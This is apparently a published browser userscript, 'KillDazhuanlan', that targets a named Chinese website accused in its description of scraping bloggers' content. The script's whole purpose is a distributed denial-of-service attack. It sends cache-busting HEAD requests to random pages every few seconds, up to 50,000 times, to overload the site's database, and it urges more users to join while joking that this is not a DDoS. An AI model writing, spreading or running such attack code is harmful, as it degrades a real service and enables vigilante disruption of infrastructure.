// ==UserScript==
// @name         KillDazhuanlan
// @namespace    KillDazhuanlan
// @version      2.0.1
// @description  www[dot]dazhuanlan[dot]com 该站未授权爬取了很多博主的总计逾百万条内容并持续更新，此脚本会在打开网站的情况下大概 5～9 秒 HEAD 请求一次网站的列表，迫使网站查询其数据库。可以多开标签页来加快这一节奏，但是让更多人参与进来可能会更好。不，我们没有 DDOS 什么的，我们在认真查阅贵站的内容。| HTTP 520/524
// @author       You
// @match        https://www.dazhuanlan.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/407999/KillDazhuanlan.user.js
// @updateURL https://update.greasyfork.org/scripts/407999/KillDazhuanlan.meta.js
// ==/UserScript==

(function() {

  (async function biuIt() {
    for (let i = 0; i < 50000; i++) {
      await sleep(10, 5); // wait about 5～10 seconds before next request
      biu(); // ignore response
    }
  })();

  async function biu() {
    const resp = await fetch(randUrl(), {
      "credentials": "include",
      "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1"
      },
      "method": "HEAD", // HEAD
      "mode": "cors",
       // No meanings, just for fun
      ['x-' + randHex(16)]: uuid(),
    });

    return resp.status === 200;
  }

  function randUrl() {
    const categories = ['backend', 'frontend', 'ai', 'devops', 'mobile', 'test', 'life'];
    const pageNum = rand(20490, 200);
    const queryValue = uuid();
    const queryKey = randHex();
    const category = pickOne(categories);
    const pageUrl = `https://www.dazhuanlan.com/${category}/page/${pageNum}/?${queryKey}=${queryValue}`;
    return pageUrl;
  }

  function sleep(sec = rand(8, 5)) {
    return new Promise(done => {
      setTimeout(() => done(), sec * 1000);
    });
  }

  function uuid() {
    return [
      randHex(8),
      randHex(4),
      (rand(5, 0) + 1).toString(16) + randHex(3),
      pickOne(['8', '9', 'a', 'b']) + randHex(3),
      randHex(12),
    ].join('-').toUpperCase();
  }

  function pickOne(items) {
    return items[rand(items.length)];
  }

  function randHex(len = 4) {
    // 1000 -> FFFF
    const maxHex = (Number.MAX_SAFE_INTEGER).toString(16).substr(1, len);
    const minHex = '0' + maxHex.substr(1).replace(/f/gi, '0');
    return rand(parseInt(maxHex, 16), parseInt(minHex, 16)).toString(16);
  }

  function rand(max, min = 0) {
    return Math.floor(Math.random() * max + min);
  }
})();
